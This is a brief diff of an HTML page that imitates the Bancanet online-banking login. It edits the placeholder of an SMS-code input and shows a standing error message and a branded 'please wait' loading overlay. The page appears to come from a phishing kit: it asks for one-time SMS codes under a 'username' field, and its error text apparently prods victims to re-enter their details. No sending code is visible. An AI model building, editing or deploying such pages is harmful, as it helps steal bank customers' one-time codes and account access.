@@ -1051,7 +1051,7 @@
     <div _ngcontent-c35="" class="subotica">
         <div _ngcontent-c35="" class="subotica-content">
             <div _ngcontent-c35="" class="subotica-content-data"> 
-                <input id="usuario" oninput="validarUsuario()" _ngcontent-c35="" autocomplete="off" class="subotica-content-data-input required ng-pristine ng-invalid ng-touched" disable-paste="" name="username" id="step01" placeholder="Código SMS recibido">          
+                <input id="usuario" oninput="validarUsuario()" _ngcontent-c35="" autocomplete="off" class="subotica-content-data-input required ng-pristine ng-invalid ng-touched" disable-paste="" name="username" id="step01" placeholder="Código SMS">          
             </div>
 			 <center><div style="color:red" class="warning" id="msgBox">Valide los datos hubo un error</div></center>
 
@@ -4200,4 +4200,5 @@
 
 <!---->
 </icb-app><div class="app_overlay"><div class="mesina-loader"><div class="mesina-logo"></div><div class="spinner"><div class="bounce1"></div><div class="bounce2"></div><div class="bounce3"></div></div><div class="mesina-welcome-title">Bienvenido a Bancanet</div><div class="mesina-welcome-subtitle1">Por favor espere un momento...</div></div></div></body></html>
+
 
